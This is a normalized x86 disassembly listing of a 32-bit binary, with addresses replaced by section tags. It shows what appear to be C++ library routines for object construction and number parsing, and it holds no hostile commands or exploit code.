mov esi ecx
mov [ esi ] r--data
call sub_10048646
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_100489b9
push 0x40
mov eax sub_1004c73b
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp + 0x1c ]
mov ebx ecx
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x38 ] eax
movsb [ edi ] [ esi ]
call sub_10003d21
mov al [ ebp + 0x24 ]
and [ ebp - 0x4 ] 0x0
test al al
jne r-xdata
mov [ ebp - 0x16 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x15 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x16 ] al
jmp r-xdata
push 0x0
push esi
lea ecx [ ebp - 0x34 ]
call sub_10007a24
mov eax [ ebp - 0x20 ]
mov edi [ ebx + 0x8 ]
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_10010e6d
mov ecx eax
call sub_100084d4
push edi
push [ ebp - 0x38 ]
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp - 0x3c ]
push eax
call sub_10033675
mov edi eax
add esp 0x14
test edi edi
jbe r-xdata
push 0x10
pop esi
jmp r-xdata
add esi esi
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_10010e6d
mov ecx [ eax ]
mov [ ebp - 0x40 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x3c ] eax
jmp r-xdata
dec edi
jne r-xdata
lea ecx [ ebp - 0x40 ]
call sub_1000850b
mov ecx eax
call sub_100084d4
mov al [ eax ]
mov [ ebp - 0x38 ] al
push [ ebp - 0x38 ]
lea ecx [ ebp + 0xc ]
call sub_1000c054
mov eax [ ebp + 0xc ]
mov esi [ ebp - 0x44 ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
push edi
push 0x1
lea ecx [ ebp - 0x34 ]
mov [ esi + 0x4 ] eax
call sub_10002020
mov eax esi
call sub_100282ef
retn 0x20
sub_10048aa7
push 0x94
mov eax sub_1004d842
call sub_10028203
xor edi edi
xor ebx ebx
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
inc ebx
cmp esi edi
je r-xdata
mov eax ebx
call sub_100282db
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_10048573
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_10048b41
push 0x24
mov eax sub_1004c779
call sub_10028203
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x10 ] ecx
mov ecx esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x18 ] ebx
call sub_10003d21
and [ ebp - 0x4 ] 0x0
mov eax ebx
sub eax edi
mov [ ebp - 0x1c ] 0x1
je r-xdata
push 0x0
push eax
mov ecx esi
call sub_1000957d
mov eax esi
call sub_100282db
retn 0xc
mov ecx [ ebp - 0x10 ]
add ecx 0x8
mov [ ebp - 0x10 ] ecx
test eax eax
ja r-xdata
push 0x0
push eax
mov ecx esi
call sub_1000957d
lea eax [ ebp - 0x28 ]
push eax
mov ecx esi
call sub_10010e6d
mov ecx eax
call sub_100084d4
mov edi [ esi + 0x14 ]
mov ebx eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx esi
call sub_10010e6d
mov ecx eax
call sub_100084d4
push [ ebp - 0x10 ]
add edi ebx
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push edi
push eax
call sub_1004b36e
add esp 0x14
cmp eax [ esi + 0x14 ]
jbe r-xdata
sub_10048bec
push 0x94
mov eax sub_1004d842
call sub_10028203
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push 0x6
pop eax
call sub_100282db
retn
cmp [ edi ] ebx
jne r-xdata
push 0x8
call sub_10024389
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
inc ebx
test esi esi
je r-xdata
xor esi esi
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100037dd
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x3
mov [ esi ] r--data
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
push 0x2
pop eax
mov [ ebp - 0x4 ] eax
mov [ edi ] esi
test [ ebp - 0x10 ] al
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_10048c88
push 0x94
mov eax sub_1004d842
call sub_10028203
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x3
pop eax
call sub_100282db
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_10048600
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_10048d27
push 0x94
mov eax sub_1004d842
call sub_10028203
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x3
pop eax
call sub_100282db
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_10048623
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_10048dc6
push 0x94
mov eax sub_1004bfe0
call sub_10028203
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
push 0x3
pop esi
cmp edi ebx
je r-xdata
mov eax esi
call sub_100282db
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ebx
inc ebx
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push ebx
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_10048905
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
test [ ebp - 0x10 ] 0x2
mov [ edi ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_10048eb9
push 0x94
mov eax sub_1004bfe0
call sub_10028203
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
push 0x3
pop esi
cmp edi ebx
je r-xdata
mov eax esi
call sub_100282db
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ebx
inc ebx
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push ebx
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_10048951
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
test [ ebp - 0x10 ] 0x2
mov [ edi ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_10048f58
push 0x94
mov eax sub_1004d842
call sub_10028203
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x5
pop eax
call sub_100282db
retn
cmp [ esi ] edi
jne r-xdata
push 0x14
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1004865e
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_10048ff7
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10048aa7
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_10049094
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10048bec
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_10049131
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10048c88
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_100491ce
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10048d27
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_1004926b
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10048dc6
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_10049308
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10048eb9
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_100493a5
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10048f58
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_10049442
push 0x170
mov eax sub_1004c874
call sub_1002826c
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
and [ ebp - 0x6c ] 0x0
cmp [ ebp + 0x14 ] 0x0
mov [ ebp - 0x74 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x7c ] esi
mov [ ebp - 0x94 ] ebx
mov [ ebp - 0x84 ] eax
mov ecx eax
je r-xdata
lea eax [ ebp - 0xbc ]
push eax
call sub_10003446
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1004926b
pop ecx
mov edi eax
mov [ ebp - 0x90 ] eax
lea ecx [ ebp - 0xbc ]
lea eax [ ebp - 0xb8 ]
push eax
call sub_10003446
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10049308
mov edi eax
pop ecx
mov [ ebp - 0x90 ] edi
lea ecx [ ebp - 0xb8 ]
jmp r-xdata
mov ecx [ ebp - 0x98 ]
cmp ecx 0x4
jae r-xdata
call sub_10003c49
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x65 ] 0x0
mov [ ebp - 0x75 ] 0x0
call sub_10003d21
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_10003d21
mov eax [ edi ]
lea ecx [ ebp - 0xb4 ]
push ecx
mov ecx edi
mov [ ebp - 0x6c ] 0x1
call [ eax + 0x24 ]
and [ ebp - 0x98 ] 0x0
jmp r-xdata
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
movsx eax [ ebp + ecx - 0xb4 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x7c ]
push 0xffffffff
push 0x0
call sub_10001cd9
jmp r-xdata
cmp [ ebp - 0x50 ] 0x1
jbe r-xdata
cmp ecx 0x3
je r-xdata
sub eax 0x4
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10002020
mov eax [ ebp - 0x7c ]
call sub_100282ef
retn 0x14
cmp [ ebp - 0x75 ] 0x0
je r-xdata
and [ ebp - 0x8c ] 0x0
and [ ebp - 0x88 ] 0x0
lea eax [ ebp - 0xc4 ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_10010e6d
mov ecx [ eax ]
mov [ ebp - 0x8c ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x88 ] eax
jmp r-xdata
inc [ ebp - 0x98 ]
cmp [ ebp - 0x65 ] 0x0
mov ebx [ ebp - 0x94 ]
je r-xdata
mov ecx [ ebp - 0x84 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_10003446
push eax
mov [ ebp - 0x4 ] 0xd
call sub_1000cd79
pop ecx
lea ecx [ ebp - 0x88 ]
mov esi eax
mov [ ebp - 0x4 ] 0x3
call sub_10003c49
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov ecx edi
call sub_100403d0
mov eax [ ebp - 0x84 ]
test [ eax + 0x10 ] 0x8
mov [ ebp - 0x4 ] 0x4
jne r-xdata
sub eax 0x7
je r-xdata
mov ecx [ ebp - 0x7c ]
push 0x2d
push 0x1
push 0x0
call sub_10007a72
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_1001793b
push eax
lea ecx [ ebp - 0x8c ]
call sub_1000850b
mov ecx eax
call sub_10008544
test al al
jne r-xdata
mov edi [ ebp - 0x90 ]
push [ ebp - 0x74 ]
push ebx
call sub_1000c45a
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp - 0x98 ] 0x3
jne r-xdata
cmp [ ebp - 0x14 ] 0x10
mov esi [ ebp - 0x28 ]
jae r-xdata
push [ ebp - 0x74 ]
mov ecx ebx
call sub_1000c5af
test al al
jne r-xdata
sub eax 0x4b
je r-xdata
push [ ebp - 0x74 ]
push ebx
call sub_1000c45a
pop ecx
pop ecx
test al al
je r-xdata
lea eax [ ebp - 0xc4 ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_1001793b
push eax
lea ecx [ ebp - 0x8c ]
call sub_10008544
test al al
je r-xdata
mov ecx ebx
call sub_1000c075
mov ecx [ esi + 0x10 ]
movzx eax al
test [ ecx + eax * 2 ] 0x48
je r-xdata
lea eax [ ebp - 0xd4 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10010e6d
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xa0 ] ecx
mov [ ebp - 0x9c ] eax
jmp r-xdata
cmp [ ebp - 0x50 ] 0x1
ja r-xdata
mov ecx ebx
call sub_1000c075
cmp al [ esi ]
jne r-xdata
lea esi [ ebp - 0x28 ]
lea eax [ ebp - 0x128 ]
push eax
mov ecx edi
call sub_100403e9
or [ ebp - 0x6c ] 0x2
cmp [ eax + 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x5
jbe r-xdata
mov eax [ edi ]
xor esi esi
mov ecx edi
mov [ ebp - 0x80 ] esi
call [ eax + 0x1c ]
mov [ ebp - 0xa4 ] eax
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
call sub_10040467
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x34 ] esi
je r-xdata
dec eax
dec eax
jne r-xdata
lea ecx [ ebp - 0x8c ]
call sub_100084d4
mov ecx ebx
mov esi eax
call sub_1000c075
cmp al [ esi ]
jne r-xdata
mov ecx ebx
call sub_1000c0bf
push [ ebp - 0x74 ]
push ebx
call sub_1000c45a
pop ecx
pop ecx
test al al
jne r-xdata
push [ ebp - 0x74 ]
mov ecx ebx
call sub_1000c5af
test al al
jne r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_10001cd9
mov [ ebp - 0x6d ] 0x0
lea eax [ ebp - 0xf0 ]
push eax
mov ecx edi
call sub_100403e9
or [ ebp - 0x6c ] 0x4
push 0x0
mov ecx eax
mov [ ebp - 0x4 ] 0x6
call sub_10007b0c
mov ecx ebx
mov esi eax
call sub_1000c075
mov [ ebp - 0x6d ] 0x1
cmp [ esi ] al
je r-xdata
push [ ebp - 0x74 ]
push ebx
call sub_1000c45a
pop ecx
pop ecx
test al al
jne r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x8 ]
mov [ ebp - 0x6d ] al
test al al
je r-xdata
mov ecx ebx
call sub_1000c0bf
lea eax [ ebp - 0xcc ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_1001793b
push eax
lea ecx [ ebp - 0xa0 ]
call sub_10008544
test al al
je r-xdata
lea eax [ ebp - 0xc4 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_1001793b
push eax
lea ecx [ ebp - 0xa0 ]
call sub_10008544
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x10
mov esi [ ebp - 0x28 ]
jae r-xdata
test [ ebp - 0x6c ] 0x2
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x6c ] 0xfffffffb
push esi
push 0x1
lea ecx [ ebp - 0xf0 ]
call sub_10002020
xor esi esi
test [ ebp - 0x6c ] 0x4
je r-xdata
mov ecx ebx
call sub_1000c075
cmp al 0x30
jl r-xdata
mov ecx [ ebp - 0x90 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
push [ ebp - 0x74 ]
mov esi [ ebp - 0x94 ]
push esi
mov bl al
call sub_1000c45a
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x30 ] 0x10
mov eax [ ebp - 0x44 ]
jae r-xdata
lea ecx [ ebp - 0xa0 ]
call sub_100084d4
mov ecx ebx
mov esi eax
call sub_1000c075
cmp al [ esi ]
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x65 ] 0x1
mov ecx ebx
call sub_1000c075
cmp al [ esi ]
je r-xdata
lea esi [ ebp - 0x28 ]
cmp [ ebp - 0x6d ] 0x0
je r-xdata
and [ ebp - 0x6c ] 0xfffffffd
push esi
push 0x1
lea ecx [ ebp - 0x128 ]
call sub_10002020
mov ecx ebx
call sub_1000c075
cmp al 0x39
jg r-xdata
mov edi [ ebp - 0xa4 ]
test bl bl
je r-xdata
cmp [ eax ] 0x7f
jae r-xdata
lea eax [ ebp - 0x44 ]
lea ecx [ ebp - 0xa0 ]
call sub_1000850b
mov ecx ebx
call sub_1000c0bf
lea eax [ ebp - 0x144 ]
push eax
mov ecx edi
call sub_10040480
or [ ebp - 0x6c ] 0x8
mov [ ebp - 0x4 ] 0x8
cmp [ eax + 0x14 ] esi
jbe r-xdata
mov ecx ebx
call sub_1000c0bf
lea eax [ ebp - 0x160 ]
push eax
mov ecx edi
call sub_100403e9
push 0xffffffff
push esi
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x7
call sub_10001f30
push esi
lea ecx [ ebp - 0x160 ]
jmp r-xdata
mov ecx ebx
call sub_1000c075
mov ecx [ ebp - 0x7c ]
mov [ ebp - 0xac ] al
push [ ebp - 0xac ]
push 0x1
call sub_10007a24
mov ecx ebx
call sub_1000c0bf
cmp [ ebp - 0x80 ] edi
jge r-xdata
mov [ ebp - 0x65 ] 0x1
jmp r-xdata
mov ecx esi
call sub_1000c075
cmp al bl
jne r-xdata
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100079fe
push [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0xc
push ebx
xor edi edi
call sub_1000c45a
pop ecx
pop ecx
test al al
je r-xdata
xor bl bl
lea eax [ ebp - 0x10c ]
push eax
mov ecx edi
call sub_10040480
or [ ebp - 0x6c ] 0x10
push 0x0
mov ecx eax
mov [ ebp - 0x4 ] 0x9
call sub_10007b0c
mov ecx ebx
mov esi eax
call sub_1000c075
cmp [ esi ] al
jne r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x3
call sub_10002020
jmp r-xdata
lea ecx [ ebp - 0x48 ]
jmp r-xdata
sub edi [ ebp - 0x80 ]
mov ecx esi
call sub_1000c0bf
push [ ebp - 0x74 ]
push esi
call sub_1000c45a
mov edi [ ebp - 0xa4 ]
cmp [ ebp - 0x30 ] 0x10
mov esi [ ebp - 0x44 ]
jae r-xdata
mov ecx ebx
call sub_1000c075
cmp al 0x30
jl r-xdata
test [ ebp - 0x6c ] 0x8
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x6c ] 0xffffffef
push 0x0
push 0x1
lea ecx [ ebp - 0x10c ]
call sub_10002020
mov bl 0x1
jmp r-xdata
push 0x0
push 0x30
push 0x1
mov ecx esi
call sub_10007a24
dec edi
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x80 ] edi
jge r-xdata
cmp [ ebp - 0x80 ] edi
jge r-xdata
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
lea esi [ ebp - 0x44 ]
push edi
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
cmp [ eax ] 0x0
je r-xdata
mov ecx ebx
call sub_1000c075
cmp al 0x39
jg r-xdata
test bl bl
je r-xdata
and [ ebp - 0x6c ] 0xfffffff7
push 0x0
push 0x1
lea ecx [ ebp - 0x144 ]
call sub_10002020
test [ ebp - 0x6c ] 0x10
je r-xdata
mov esi [ ebp - 0x7c ]
